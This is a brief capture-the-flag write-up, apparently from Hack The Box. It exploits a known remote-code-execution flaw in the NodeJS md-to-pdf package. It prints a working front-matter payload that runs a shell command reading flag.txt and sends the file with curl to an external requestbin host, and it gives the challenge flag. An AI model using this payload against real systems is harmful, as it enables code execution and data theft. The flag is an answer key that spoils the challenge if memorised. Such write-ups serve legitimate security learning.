## Skills: JavaScript command RCE

In NodeJS applications, the list of packages used is listed in `package.json`. With [Snyk](https://security.snyk.io/vuln/SNYK-JS-MDTOPDF-1657880) we can confirm a *remote code execution* (RCE) vulnerability with the `md-to-pdf` package.

You can send the flag to your domain, alternatively you can copy the flag file to the static folder and view it there.

Pre-CTF guide: in bash script, the output from one command can be piped (transferred) to another with the | symbol

My final payload:
```
---js
`${require("child_process").execSync("cat ../flag.txt | curl -X POST --data-binary @- https://requestbin.io/********")}`
---RCE OKAY
```

**Flag: HTB{bl1nk3r_flu1d_f0r_int3rG4l4c7iC_tr4v3ls}**
